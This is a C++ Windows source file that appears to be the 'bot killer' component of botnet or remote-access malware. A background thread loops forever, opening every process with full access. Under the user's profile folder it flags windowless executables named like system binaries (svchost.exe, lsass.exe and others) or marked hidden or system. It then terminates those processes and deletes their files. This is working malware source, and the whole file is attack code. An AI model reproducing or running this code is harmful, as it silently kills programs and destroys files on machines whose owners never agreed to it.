#include "BackgroundRoutine.h"
#include <Shlobj.h>
#include <tlhelp32.h>
#include <Shlwapi.h>


HWND hWndOutput = NULL;


BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam) {

	DWORD dwPID = (DWORD)lParam;

	DWORD dwCurrentPID = 0;

	GetWindowThreadProcessId(hWnd, &dwCurrentPID);

	if (dwCurrentPID == dwPID) {
		hWndOutput = hWnd;
		return FALSE;
	}

	return TRUE;

}


HWND FindWndByPID(DWORD dwPID) {

	hWndOutput = NULL;

	EnumWindows(EnumWindowsProc, dwPID);

	return hWndOutput;

}

BOOL DetectBotByProcEntry(PROCESSENTRY32 pEntry) {

	if (!IsWindowVisible(FindWndByPID(pEntry.th32ProcessID))) {

		LPCWSTR SuspiciousProcesses[]{
			L"runtimebroker.exe",
			L"dllhost.exe",
			L"wscript.exe",
			L"svchost.exe",
			L"services.exe",
			L"smss.exe",
			L"lsass.exe",
			L"csrss.exe",
			L"lms.exe",
			L"wininet.exe",
			L"system.exe",
			L"update.exe",
			L"explorer.exe",
			L"regasm.exe"
		};

		for (int i = 0; i < 14; i++) 
		{
			if (lstrcmpW(pEntry.szExeFile, SuspiciousProcesses[i]) == ERROR_SUCCESS) {
				return TRUE;
			}
		}

	}

	return FALSE;
}


BOOL DetectBotByFileAttributes(LPCWSTR pszBotPath) {

	DWORD dwAttrs = GetFileAttributesW(pszBotPath);

	if (dwAttrs == FILE_ATTRIBUTE_SYSTEM || dwAttrs == FILE_ATTRIBUTE_HIDDEN)
		return TRUE;
	else
		return FALSE;
}


BOOL KillBot(HANDLE hProcess) {

	if (!TerminateProcess(hProcess, 0))
		return FALSE;

	Sleep(2500);

	return TRUE;

}


BOOL RemoveBot(LPWSTR pszBotPath) {

	if (GetFileAttributesW(pszBotPath) != FILE_ATTRIBUTE_NORMAL) {
		SetFileAttributesW(pszBotPath, FILE_ATTRIBUTE_NORMAL);
	}

	return DeleteFileW(pszBotPath);
}

DWORD WINAPI BotKillerThread(LPVOID lpParam) {

	try {
		LPWSTR pszAppData = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));

		if (!SHGetSpecialFolderPathW(NULL, pszAppData, CSIDL_APPDATA, FALSE))
			return NULL;

		DWORD dwAppDataLenght = lstrlenW(pszAppData);

		pszAppData[dwAppDataLenght - 7] = L'\0';

		while (TRUE)
		{
			Sleep(3500);

			PROCESSENTRY32 pEntry;
			pEntry.dwSize = sizeof(PROCESSENTRY32);

			HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

			if (Process32First(hSnap, &pEntry)) {

				while (Process32Next(hSnap, &pEntry)) {

					HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pEntry.th32ProcessID);

					if (hProcess && hProcess != GetCurrentProcess()) {

						DWORD dwSize = MAX_PATH;
						LPWSTR pszFullPath = (LPWSTR)malloc(dwSize * sizeof(WCHAR));
						memset(pszFullPath, 0, dwSize * sizeof(WCHAR));

						QueryFullProcessImageNameW(hProcess, NULL, pszFullPath, &dwSize);


						if (StrStrW(pszFullPath, pszAppData) && (DetectBotByProcEntry(pEntry) || DetectBotByFileAttributes(pszFullPath))) {
							KillBot(hProcess);
							RemoveBot(pszFullPath);
						}

						free(pszFullPath);
					}
				}
			}
			CloseHandle(hSnap);
		}
	}
	catch (...) {

	}

	ExitThread(EXIT_SUCCESS);
}


DWORD WINAPI BackgroundRoutine(LPVOID lpParam) 
{
	CreateThread(0, 0, BotKillerThread, 0, 0, 0);

	return 0;
	
}
